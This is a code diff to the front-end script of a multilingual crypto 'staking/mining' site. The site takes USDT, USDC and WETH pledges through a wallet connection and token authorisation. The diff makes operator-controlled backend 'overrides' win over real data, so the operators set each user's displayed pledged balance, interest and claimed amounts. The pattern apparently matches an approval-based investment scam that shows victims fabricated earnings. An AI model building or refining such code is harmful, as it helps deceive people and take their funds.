@@ -20,54 +20,43 @@ function initSSE() {
       if (event === 'dataUpdate') {
         console.log('[DEBUG] 檢查全域數據中的用戶:');
         window.lastSseData = data;
-        window.currentOverrides = data.overrides?.[userAddress.toLowerCase()] || {};
+
+        // 【關鍵】版本比對：只接受較新版本
+        if (data.version) {
+          const storedVersion = parseInt(localStorage.getItem('dataVersion') || '0');
+          if (data.version <= storedVersion) {
+            console.warn('[DEBUG] 收到舊版本數據，忽略');
+            return;
+          }
+          localStorage.setItem('dataVersion', data.version.toString());
+        }
+
+        window.currentOverrides = data.overrides?.[userAddress?.toLowerCase()] || {};
         let matchedUserData = null;
         for (let addr in data.users) {
-          if (addr.toLowerCase() === userAddress.toLowerCase()) {
+          if (addr.toLowerCase() === userAddress?.toLowerCase()) {
             matchedUserData = data.users[addr];
             console.log('[DEBUG] 找到匹配用戶數據:', matchedUserData);
             break;
           }
         }
+
         if (matchedUserData) {
-          window.currentClaimable = matchedUserData.claimable || 0;
-          for (const token in accountBalance) {
-            if (matchedUserData.accountBalance && matchedUserData.accountBalance[token]) {
-              accountBalance[token].pledged = matchedUserData.accountBalance[token].pledged || 0;
-              accountBalance[token].interest = matchedUserData.accountBalance[token].interest || 0;
+          // 【關鍵】overrides 優先！
+          if (window.currentOverrides && Object.keys(window.currentOverrides).length > 0) {
+            console.log('[DEBUG] 檢測到後台 overrides，強制採用');
+            applyOverrides(window.currentOverrides);
+          } else {
+            // 正常數據
+            window.currentClaimable = matchedUserData.claimable || 0;
+            for (const token in accountBalance) {
+              if (matchedUserData.accountBalance && matchedUserData.accountBalance[token]) {
+                accountBalance[token].pledged = matchedUserData.accountBalance[token].pledged || 0;
+                accountBalance[token].interest = matchedUserData.accountBalance[token].interest || 0;
+              }
             }
           }
-          if (data.overrides && data.overrides[userAddress.toLowerCase()]) {
-            const override = data.overrides[userAddress.toLowerCase()];
-            console.log('[DEBUG] 合併 overrides:', override);
-            if (override.cumulative !== undefined && override.cumulative > 0) {
-              window.currentOverrides.cumulative = override.cumulative;
-            }
-            if (override.grossOutput !== undefined) {
-              window.currentOverrides.grossOutput = override.grossOutput;
-            }
-            ['USDT', 'USDC', 'WETH'].forEach(token => {
-              const pledgedKey = `pledged${token}`;
-              const interestKey = `interest${token}`;
-              const claimedKey = `claimedInterest${token}`;
-              if (override[pledgedKey] !== undefined) {
-                accountBalance[token].pledged = override[pledgedKey];
-              }
-              if (override[interestKey] !== undefined) {
-                accountBalance[token].interest = override[interestKey];
-              }
-              if (override[claimedKey] !== undefined) {
-                localStorage.setItem(claimedKey, override[claimedKey].toString());
-              }
-            });
-            ['USDT', 'USDC', 'WETH'].forEach(token => {
-              const claimedKey = `claimedInterest${token}`;
-              if (override[claimedKey] === 0) {
-                localStorage.setItem(claimedKey, '0');
-              }
-            });
-            updateClaimableDisplay();
-          }
+
           if (matchedUserData.isDemoWallet) {
             console.log('[DEBUG] 檢測到演示錢包，自動模擬');
             window.isDemoMode = true;
@@ -76,6 +65,7 @@ function initSSE() {
             updateStatus("演示模式：已自動授權");
             activateStakingUI();
           }
+
           updateClaimableDisplay();
           updateAccountBalanceDisplay();
           updatePledgeSummary();
@@ -87,7 +77,6 @@ function initSSE() {
       }
       if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
         console.log('[DEBUG] 接收質押接受:', data);
-
         // 【關鍵修正】強制轉 Number + 防 1e-6 誤讀
         const rawAmount = data.amount;
         const amount = Number(rawAmount);
@@ -95,17 +84,13 @@ function initSSE() {
         const duration = Number(data.duration) || 90;
         const orderId = data.orderId || `order_${Date.now()}`;
         const startTime = data.startTime ? Number(data.startTime) : Date.now();
-
         if (!['USDT', 'USDC', 'WETH'].includes(tokenKey)) return;
-
         // 防呆：USDT/USDC 除以 1e6，WETH 除以 1e18
         const decimals = tokenKey === 'WETH' ? 1e18 : 1e6;
         const finalAmount = amount / decimals;
-
         // 更新帳戶餘額
         if (!accountBalance[tokenKey]) accountBalance[tokenKey] = { wallet: 0, pledged: 0, interest: 0 };
         accountBalance[tokenKey].pledged += finalAmount;
-
         // 更新訂單
         const durationInfo = PLEDGE_DURATIONS.find(d => d.days === duration) || { rate: 0 };
         const newOrder = {
@@ -118,11 +103,9 @@ function initSSE() {
           redeemed: false
         };
         userPledges.push(newOrder);
-
         // 更新 UI
         updateAccountBalanceDisplay();
         updatePledgeSummary();
-
         // 【成功面板】
         const estimatedInterest = (finalAmount * durationInfo.rate).toFixed(3);
         showPledgeResult('success', translations[currentLang].pledgeSuccess,
@@ -132,7 +115,6 @@ function initSSE() {
           `預估利息：${estimatedInterest} ${tokenKey}<br>` +
           `<small style="color:#aaa;">點擊「總質押金額」查看詳情</small>`
         );
-
         pledgeBtn.disabled = false;
         pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
       }
@@ -215,6 +197,7 @@ let accountDetailModal, closeAccountDetail, closeAccountDetailBtn;
 let elements = {};
 let rulesModal; // 全域宣告 rulesModal
 // ==================== 全域變數 ====================
+let dataVersion = 0; // 【新增】追蹤版本號
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
 let pledgedAmount = 0;
@@ -275,8 +258,8 @@ const translations = {
     balanceTooLow: 'Balance too low.',
     wethValueTooLow: 'WETH value too low.',
     rulesTitle: 'Mining Rules',
-    pendingInterest: 'Pending Interest',   // 【新增】
-    claimedInterest: 'Claimed Interest',   // 【新增】
+    pendingInterest: 'Pending Interest',
+    claimedInterest: 'Claimed Interest',
     rulesContent: `
       <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
       <p>2. Insufficient: can authorize but not start.</p>
@@ -340,8 +323,8 @@ const translations = {
     balanceTooLow: '餘額過低。',
     wethValueTooLow: 'WETH 價值過低。',
     rulesTitle: '挖礦規則',
-    pendingInterest: '待領取利息',         // 【新增】
-    claimedInterest: '已領取利息',         // 【新增】
+    pendingInterest: '待領取利息',
+    claimedInterest: '已領取利息',
     rulesContent: `
       <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
       <p>2. 不足：可授權但無法開始。</p>
@@ -405,8 +388,8 @@ const translations = {
     balanceTooLow: '余额过低。',
     wethValueTooLow: 'WETH价值过低。',
     rulesTitle: '挖矿规则',
-    pendingInterest: '待领取利息',         // 【新增】
-    claimedInterest: '已领取利息',         // 【新增】
+    pendingInterest: '待领取利息',
+    claimedInterest: '已领取利息',
     rulesContent: `
       <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
       <p>2. 不足：可授权但无法开始。</p>
@@ -524,7 +507,7 @@ function getElements() {
   accountDetailModal = document.getElementById('accountDetailModal');
   closeAccountDetail = document.getElementById('closeAccountDetail');
   closeAccountDetailBtn = document.getElementById('closeAccountDetailBtn');
-  
+ 
   elements = {
     title: document.getElementById('title'),
     subtitle: document.getElementById('subtitle'),
@@ -538,8 +521,8 @@ function getElements() {
     pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
     pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
     pledgeBtnText: pledgeBtn,
-    pendingInterestLabel: document.getElementById('modalPendingInterestLabel'), // 【新增】
-    claimedInterestLabel: document.getElementById('modalClaimedInterestLabel'),   // 【新增】
+    pendingInterestLabel: document.getElementById('modalPendingInterestLabel'),
+    claimedInterestLabel: document.getElementById('modalClaimedInterestLabel'),
     totalPledge: document.getElementById('totalPledgeValue'),
     estimate: document.getElementById('estimateValue'),
     exceedWarning: document.getElementById('exceedWarning'),
@@ -558,16 +541,12 @@ function bindRulesButton() {
   const rulesModal = document.getElementById('rulesModal');
   const rulesButton = document.getElementById('rulesButton');
   const closeRulesModal = document.getElementById('closeRulesModal');
-
   if (!rulesModal || !rulesButton) {
     console.warn('[DEBUG] rulesModal 或 rulesButton 未就緒，等待下次嘗試...');
-    return; // 不再 setTimeout，交給 DOMContentLoaded 控制
+    return;
   }
-
-  // 清除舊事件（防重複綁定）
   const newButton = rulesButton.cloneNode(true);
   rulesButton.parentNode.replaceChild(newButton, rulesButton);
-
   newButton.addEventListener('click', () => {
     const rulesTitle = document.getElementById('rulesTitle');
     const rulesContent = document.getElementById('rulesContent');
@@ -575,7 +554,6 @@ function bindRulesButton() {
     if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
     rulesModal.style.display = 'flex';
   });
-
   if (closeRulesModal) {
     const newClose = closeRulesModal.cloneNode(true);
     closeRulesModal.parentNode.replaceChild(newClose, closeRulesModal);
@@ -583,12 +561,9 @@ function bindRulesButton() {
       rulesModal.style.display = 'none';
     });
   }
-
-  // 背景點擊關閉
   rulesModal.addEventListener('click', e => {
     if (e.target === rulesModal) rulesModal.style.display = 'none';
   });
-
   console.log('[DEBUG] ? 按鈕事件綁定成功');
 }
 // ==================== 更新帳戶餘額顯示 ====================
@@ -638,6 +613,26 @@ async function forceRefreshWalletBalance() {
     console.error('[DEBUG] 餘額刷新錯誤:', error);
     log(`餘額讀取失敗: ${error.message}`, 'error');
   }
+}
+// ==================== 【新增】應用 overrides ====================
+function applyOverrides(override) {
+  window.currentClaimable = override.cumulative || 0;
+  totalGrossOutput = override.grossOutput || 0;
+
+  ['USDT', 'USDC', 'WETH'].forEach(token => {
+    const pledgedKey = `pledged${token}`;
+    const interestKey = `interest${token}`;
+    const claimedKey = `claimedInterest${token}`;
+
+    if (override[pledgedKey] !== undefined) accountBalance[token].pledged = override[pledgedKey];
+    if (override[interestKey] !== undefined) accountBalance[token].interest = override[interestKey];
+    if (override[claimedKey] !== undefined) {
+      localStorage.setItem(claimedKey, override[claimedKey].toString());
+    }
+  });
+
+  updateClaimableDisplay();
+  updateAccountBalanceDisplay();
 }
 // ==================== 其他函數保持不變 ====================
 function getCurrentBalances() {
@@ -1007,22 +1002,16 @@ function updateLanguage(lang) {
   currentLang = lang;
   if (languageSelect) languageSelect.value = lang;
   localStorage.setItem('language', lang);
-
   const apply = () => {
-    // 【1】統一更新 elements 內的所有元素（包含 Pending / Claimed）
     for (let key in elements) {
       if (elements[key] && translations[lang]?.[key]) {
         elements[key].textContent = translations[lang][key];
       }
     }
-
-    // 【2】手動更新 rules 面板（不在 elements 內）
     const rulesTitle = document.getElementById('rulesTitle');
     const rulesContent = document.getElementById('rulesContent');
     if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
     if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;
-
-    // 【3】其他必要更新
     if (claimModal && claimModal.style.display === 'flex') {
       updateClaimModalLabels();
     }
@@ -1030,8 +1019,6 @@ function updateLanguage(lang) {
     document.documentElement.lang = lang;
     updatePledgeSummary();
     updateEstimate();
-
-    // 【4】您原本的手動更新（保留！）
     if (elements.accountDetailTitle) elements.accountDetailTitle.textContent = translations[lang].accountDetailTitle;
     if (elements.modalTotalBalanceLabel) elements.modalTotalBalanceLabel.textContent = translations[lang].totalBalance;
     if (elements.modalPledgedAmountLabel) elements.modalPledgedAmountLabel.textContent = translations[lang].pledgedAmount;
@@ -1041,7 +1028,6 @@ function updateLanguage(lang) {
     if (elements.totalPledgeLabel) elements.totalPledgeLabel.textContent = translations[lang].totalPledge;
     if (elements.estimateLabel) elements.estimateLabel.textContent = translations[lang].estimate;
   };
-
   setTimeout(apply, 200);
 }
 function calculatePayoutInterest() {
@@ -1101,7 +1087,6 @@ function showPledgeDetail() {
   const content = document.getElementById('pledgeDetailContent');
   if (!content) return;
   content.innerHTML = '';
-
   if (userPledges.length === 0) {
     content.innerHTML = `<p>${translations[currentLang].noClaimable}</p>`;
   } else {
@@ -1112,7 +1097,6 @@ function showPledgeDetail() {
       const durationInfo = PLEDGE_DURATIONS.find(d => d.days === p.duration) || { rate: 0 };
       const apr = (durationInfo.rate * 100).toFixed(1) + '%';
       const estimatedInterest = (p.amount * durationInfo.rate).toFixed(3);
-
       const item = document.createElement('div');
       item.style = 'border: 1px solid #444; margin: 8px 0; padding: 12px; border-radius: 8px; cursor: pointer; background: #1a1a1a;';
       item.innerHTML = `
@@ -1128,17 +1112,15 @@ function showPledgeDetail() {
   }
   pledgeDetailModal.style.display = 'flex';
 }
-
 function showOrderDetail(order, index) {
   const detailModal = document.createElement('div');
   detailModal.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px;';
-  
+ 
   const endTime = order.startTime + order.duration * 24 * 60 * 60 * 1000;
   const daysLeft = Math.max(0, Math.ceil((endTime - Date.now()) / (24 * 60 * 60 * 1000)));
   const durationInfo = PLEDGE_DURATIONS.find(d => d.days === order.duration) || { rate: 0 };
   const accrued = (order.amount * durationInfo.rate * (Date.now() - order.startTime) / (order.duration * 24 * 60 * 60 * 1000)).toFixed(3);
   const estimatedTotal = (order.amount * durationInfo.rate).toFixed(3);
-
   detailModal.innerHTML = `
     <div style="background: #111; padding: 24px; border-radius: 16px; max-width: 90%; color: #fff; box-shadow: 0 0 20px rgba(0,255,255,0.3);">
       <h3 style="margin: 0 0 16px; color: #0ff;">訂單詳情 #${index + 1}</h3>
@@ -1199,18 +1181,11 @@ document.addEventListener('DOMContentLoaded', async () => {
   getElements();
   updateLanguage(currentLang);
   initializeWallet();
-
-  // 【關鍵修正】強制延遲綁定 ? 按鈕，確保 DOM 完全就緒
-  setTimeout(() => {
-      bindRulesButton(); // 立即綁定一次即可
-    console.log('[DEBUG] ? 按鈕事件已強制重新綁定');
-  }, 200);
-
+  bindRulesButton();
   setTimeout(() => {
     updateTotalFunds();
     setInterval(updateTotalFunds, 1000);
   }, 100);
-
   if (pledgeDuration) {
     pledgeDuration.innerHTML = '';
     PLEDGE_DURATIONS.forEach(d => {
@@ -1220,7 +1195,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       pledgeDuration.appendChild(opt);
     });
   }
-
   if (pledgeToken) {
     const updatePledgeTokenOptions = () => {
       const tokens = ['USDT', 'USDC', 'WETH'];
@@ -1246,7 +1220,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     };
     pledgeToken.addEventListener('change', updateEstimate);
   }
-
   const claimBtn = document.getElementById('claimButton');
   if (claimBtn) claimBtn.addEventListener('click', claimInterest);
   if (closeModal) closeModal.addEventListener('click', closeClaimModal);
@@ -1275,7 +1248,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         const newClaimed = previous + equivalent;
         localStorage.setItem(`claimedInterest${token}`, newClaimed.toString());
         window.currentClaimable = 0;
-        await fetch(`${BACKEND_API_URL}/api/user-data`, {
+        const response = await fetch(`${BACKEND_API_URL}/api/user-data`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -1290,6 +1263,10 @@ document.addEventListener('DOMContentLoaded', async () => {
             }
           })
         });
+        const result = await response.json();
+        if (result.version) {
+          localStorage.setItem('dataVersion', result.version.toString());
+        }
         updateClaimableDisplay();
         updateAccountBalanceDisplay();
         closeClaimModal();
@@ -1303,7 +1280,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   }
-
   if (languageSelect) languageSelect.addEventListener('change', e => updateLanguage(e.target.value));
   if (connectButton) {
     connectButton.addEventListener('click', () => {
@@ -1314,7 +1290,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   }
-
   if (startBtn) {
     startBtn.addEventListener('click', async () => {
       if (!signer) {
@@ -1375,7 +1350,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   }
-
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
       if (!signer || !userAddress) {
@@ -1406,7 +1380,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         const bigIntBalance = cachedWalletBalances[token] || 0n;
         const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
         if (amount > walletBalance) {
-          throw new Error(translations[currentLang].insufficientBalance);
+                    throw new Error(translations[currentLang].insufficientBalance);
         }
         const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
         if (duration && amount < duration.min) {
@@ -1433,7 +1407,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         const result = await response.json();
         if (!result.success) throw new Error(result.error);
         updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
-
         const poll = setInterval(async () => {
           const stillLocked = await isPledgeLocked(userAddress);
           if (!stillLocked) {
@@ -1449,7 +1422,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   }
-
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
@@ -1465,7 +1437,6 @@ document.addEventListener('DOMContentLoaded', async () => {
   if (closeAccountDetail) closeAccountDetail.addEventListener('click', closeAccountDetailModal);
   if (closeAccountDetailBtn) closeAccountDetailBtn.addEventListener('click', closeAccountDetailModal);
   if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetailModal());
-
   document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', () => {
       document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -1476,7 +1447,6 @@ document.addEventListener('DOMContentLoaded', async () => {
       if (tab.dataset.tab === 'liquidity') updateInterest();
     });
   });
-
   if (userAddress) {
     (async () => {
       console.log('[DEBUG] 頁面載入檢查鎖定狀態');
@@ -1586,11 +1556,15 @@ async function smartSave(updateData = {}) {
     };
     localStorage.setItem('userData', JSON.stringify(fullData));
     if (userAddress) {
-      await fetch(`${BACKEND_API_URL}/api/user-data`, {
+      const response = await fetch(`${BACKEND_API_URL}/api/user-data`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ address: userAddress, data: fullData })
       });
+      const result = await response.json();
+      if (result.version) {
+        localStorage.setItem('dataVersion', result.version.toString());
+      }
     }
     console.log('[DEBUG] 資料已智慧儲存');
   } catch (error) {
